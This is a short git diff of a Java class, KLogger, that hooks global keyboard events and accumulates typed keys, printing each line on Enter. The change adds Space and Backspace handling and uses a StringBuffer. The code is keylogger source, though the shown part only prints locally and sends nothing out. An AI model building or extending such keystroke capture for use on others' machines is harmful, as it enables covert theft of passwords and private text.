@@ -10,7 +10,7 @@ import java.util.logging.Logger;
 
 public class KLogger implements NativeKeyListener {
 
-    String input = "";
+    StringBuffer input = new StringBuffer("");
     boolean shiftPressed = false;
 
     public KLogger() throws IOException {
@@ -23,12 +23,16 @@ public class KLogger implements NativeKeyListener {
         if (key.equals("Enter")) {
             System.out.println("");
             System.out.println(input);
-            input = "";
+            input.delete(0,input.length());
+        } else if (key.equals("Space")) {
+            input.append(" ");
+        } else if (key.equals("Backspace")) {
+            if (input.length() > 0) { input.deleteCharAt(input.length()-1); }
         } else if (key.equals("Left Shift") || key.equals("Right Shift")) {
             shiftPressed = true;
         } else {
             if (!shiftPressed) key = key.toLowerCase();
-            input += key;
+            input.append("" + key);
         }
     }
 
